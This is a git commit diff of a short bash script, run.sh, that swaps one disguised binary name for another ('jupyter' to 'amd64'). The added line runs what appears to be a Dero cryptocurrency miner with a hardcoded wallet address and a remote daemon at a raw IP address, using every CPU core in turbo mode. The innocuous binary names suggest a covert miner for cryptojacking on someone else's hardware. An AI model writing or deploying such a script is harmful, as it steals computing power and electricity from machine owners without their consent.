3d0b274909878fbe4e6f25fe0b2f390f8096a8ec
chikminsaja <136205830+chikminsaja@users.noreply.github.com>
2023-06-11 18:41:32 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-chmod +x jupyter
-./jupyter -wallet-address dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w -daemon-rpc-address 138.68.182.128:443 -mining-threads $(nproc --all) -turbo -worker-name $(echo $(shuf -i 1-20000 -n 1)-DEV)
+chmod +x amd64
+./amd64 -wallet-address dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w -daemon-rpc-address 138.68.182.128:443 -mining-threads $(nproc --all) -turbo -worker-name $(echo $(shuf -i 1-20000 -n 1)-DEV)
